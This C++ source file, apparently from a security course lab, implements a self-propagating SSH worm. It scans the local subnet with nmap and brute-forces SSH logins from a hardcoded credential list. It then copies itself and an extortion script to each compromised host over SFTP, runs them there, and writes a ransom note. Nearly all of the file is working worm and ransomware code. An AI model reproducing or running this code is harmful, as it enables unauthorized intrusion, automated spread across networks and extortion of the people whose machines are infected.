#define LIBSSH_STATIC 1
#include <iostream>
#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <unistd.h>
#include <stdlib.h>
#include <string>
#include <fstream>
#include <string.h> 
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <sstream>
#include <vector>
#include <map>
#include <fcntl.h>
#include <algorithm>
using namespace std;

// Dictionary to use
map<string, string> credList = { { "ubuntu", "123456" }, { "hello1", "world" }, { "root", "Gig" }, { "orange", "juice" }, { "cpsc", "cpsc" } };
vector<string> vectorHosts;

void foobar(ssh_session session)
{
	sftp_session sftp;
	sftp_file file;
	int rc, write, length;

	// Create a new sftp session
	sftp = sftp_new(session);
	if (sftp == NULL)
	{
		cout << "SFTP session error!\n";
		exit(-1);
	}

	// Initialize the session
	rc = sftp_init(sftp);
	if (rc != SSH_OK)
	{
		cout << "SFTP initialization error!\n";
		exit(-1);
	}

	// Check infected
	file = sftp_open(sftp, "/tmp/infected.txt", O_RDONLY, S_IRWXU);
	if (file == NULL)
	{
		cout << "System is not infected!\n";
		cout << "Beginning infection!\n";

		file = sftp_open(sftp, "/home/ubuntu/remu.sh", O_RDWR | O_CREAT | O_TRUNC, S_IRWXU | S_IRWXO | S_IRWXG);
		if (file == NULL)
		{
			cout << "File write error!" << endl;
			exit(-1);
		}

		// Copy extort script to remote
		ifstream shark("/home/ubuntu/remu.sh", ios::binary);
		if (shark)
		{
			shark.seekg(0, shark.end);
			ios::pos_type len3 = shark.tellg();
			shark.seekg(0);

			char *buffer3 = new char[len3];
			shark.read(buffer3, len3);
			sftp_write(file, buffer3, len3);
			shark.close();
			rc = sftp_close(file);
			if (rc != SSH_OK)
			{
				cout << "File close error!" << endl;
				exit(-1);
			}
		}

		file = sftp_open(sftp, "/home/ubuntu/extorter_bonus", O_RDWR | O_CREAT | O_TRUNC, S_IRWXU | S_IRWXO | S_IRWXG);
		if (file == NULL)
		{
			cout << "File write error!" << endl;
			exit(-1);
		}
		// Copy worm to remote
		ifstream send("/home/ubuntu/extorter_bonus", ios::binary);
		if (send)
		{
			send.seekg(0, send.end);
			ios::pos_type len = send.tellg();
			send.seekg(0);

			char *buffer = new char[len];
			send.read(buffer, len);
			sftp_write(file, buffer, len);
			send.close();
			rc = sftp_close(file);
			if (rc != SSH_OK)
			{
				cout << "File close error!" << endl;
				exit(-1);
			}

			// Open channel and send remote command
			ssh_channel channel;
			channel = ssh_channel_new(session);
			if (channel == NULL)
			{
				cout << "SSH channel error!\n";
				exit(-1);
			}
			rc = ssh_channel_open_session(channel);
			if (rc != SSH_OK)
			{
				cout << "SSH channel open error!\n";
				exit(-1);
			}
			rc = ssh_channel_request_exec(channel, "/home/ubuntu/extorter_bonus>error.log");
			if (rc == SSH_OK)
			{
				cout << "SSH exec ok!\n";
			}
			cout << "Infection complete!" << endl;
			cout << "Exiting!" << endl;
			exit(-1);
		}
	}
	else
	{
		cout << "System is already infected!\n";
		cout << "Moving to next target!\n";
		return;
	}
	//exit(-1);
}

void attack()
{
	string go, foo1, foo2;
	int result;
	const char *hostip;
	const char *user;
	const char *pw;
	for (auto j = vectorHosts.begin(); j != vectorHosts.end(); j++)
	{
		go = *j;
		hostip = go.c_str();
		for (auto i = credList.begin(); i != credList.end(); i++)
		{
			// New SSH Session
			ssh_session mySsh = ssh_new();
			if (mySsh == NULL){
				cout << "SSH Session failed!\n";
				exit(-1);
			}

			ssh_options_set(mySsh, SSH_OPTIONS_HOST, hostip);
			result = ssh_connect(mySsh);
			if (result != SSH_OK){
				cout << "Error connecting to host!\n";
				exit(-1);
			}

			foo1 = i->first;
			foo2 = i->second;
			cout << "Attemping user: " << foo1 << " pw: " << foo2 << endl;
			user = foo1.c_str();
			pw = foo2.c_str();
			ssh_options_set(mySsh, SSH_OPTIONS_USER, user);
			result = ssh_userauth_password(mySsh, NULL, pw);
			if (result == SSH_AUTH_SUCCESS)
			{
				cout << "Connection success!" << endl;
				foobar(mySsh);
				ssh_disconnect(mySsh);
				ssh_free(mySsh);
				break;
			}

			ssh_disconnect(mySsh);
			ssh_free(mySsh);
		}
	}

	cout << "No more targets!" << endl;
}

int main(int argc, char *argv[]){
	char *password;
	int fd, err, sock, port = 22;
	struct ifreq ifr;
	struct sockaddr_in sa;
	string home = "192.168.1.5";
	string current, temp;

	// Executed from victim
	if (argc < 2)
	{
		cout << "Kept you waiting huh? I'm in the victim." << endl;
		ifstream check("/tmp/infected.txt");
		if (check)
		{
			cout << "Marker found. Exiting!" << endl;
			exit(-1);
		}
		else
		{
			cout << "Extortion start!\n";
			system("/home/ubuntu/remu.sh");
			ofstream filet;
			filet.open("/home/ubuntu/cpsc/pirates.txt", ios::trunc);
			if (!filet){
				cout << "File open failed!\n";
				exit(-1);
			}
			filet << "Upgrade to Windows 10 if you want your files back!" << endl;
			filet.close();
			cout << "Extortion finished\n";
		}
	}

	// Mark system
	ofstream file;
	file.open("/tmp/infected.txt", ios::trunc);
	if (!file){
		cout << "File open failed!\n";
		exit(-1);
	}
	file << "I heard you like worms!" << endl;
	file.close();

	/* Faster method of network scanning. Uses nmap with additional parameters */
	FILE *in;
	char buff[20];
	auto whitespace = [](unsigned char const c) { return std::isspace(c); }; // overloaded whitespace
	string target;

	if (!(in = popen("nmap -p22 --open -oG - 192.168.1.0/24 | awk '/ssh/ {print$2}'", "r")))
	{
		cout << "Popen failed\n";
		exit(-1);
	}

	while (fgets(buff, sizeof(buff), in) != NULL)
	{
		if (isdigit(buff[0]))
		{
			target = buff;
			target.erase(std::remove_if(target.begin(), target.end(), whitespace), target.end());
			vectorHosts.push_back(target);
		}
	}
	pclose(in);

	// Get my IP
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	current = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

	// Remove certain targets from attack
	if (current == home)
	{
		vectorHosts.erase(std::remove(vectorHosts.begin(), vectorHosts.end(), home), vectorHosts.end());
	}
	else
	{
		vectorHosts.erase(std::remove(vectorHosts.begin(), vectorHosts.end(), home), vectorHosts.end());
		vectorHosts.erase(std::remove(vectorHosts.begin(), vectorHosts.end(), current), vectorHosts.end());
	}

	// Display attack targets
	cout << "Attack targets:\n";
	for (auto i = vectorHosts.begin(); i != vectorHosts.end(); i++)
	{
		cout << *i << endl;
	}

	attack();
}

